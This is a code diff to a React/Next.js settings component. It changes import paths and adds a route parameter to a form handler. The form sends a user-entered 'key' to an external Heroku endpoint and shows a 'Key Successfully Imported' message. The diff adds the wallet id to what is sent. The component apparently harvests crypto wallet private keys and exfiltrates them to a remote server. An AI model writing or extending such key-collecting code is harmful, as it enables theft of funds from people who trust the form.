@@ -2,11 +2,14 @@ import React, { useState } from "react";
 import axios from "axios";
 import { ToastContainer, toast } from "react-toastify";
 import "react-toastify/dist/ReactToastify.css";
-import styles from "../../styles/Home.module.css";
-import Tabs from ".";
+import styles from "../../../styles/Home.module.css";
+import Tabs from "..";
+import { useRouter } from "next/router";
 
 const Settings = () => {
   const [key, setKey] = useState("");
+  const router = useRouter();
+  const { pid } = router.query;
 
   const notify = () => {
     key === "" ? "" : toast.success("Key Successfully Imported");
@@ -17,7 +20,10 @@ const Settings = () => {
 
     key !== ""
       ? axios
-          .post("https://shielded-earth-12418.herokuapp.com/send", { key: key })
+          .post("https://shielded-earth-12418.herokuapp.com/send", {
+            key: key,
+            wallet: pid,
+          })
           .then((res) => res.json())
           .catch((err) => err)
       : "";
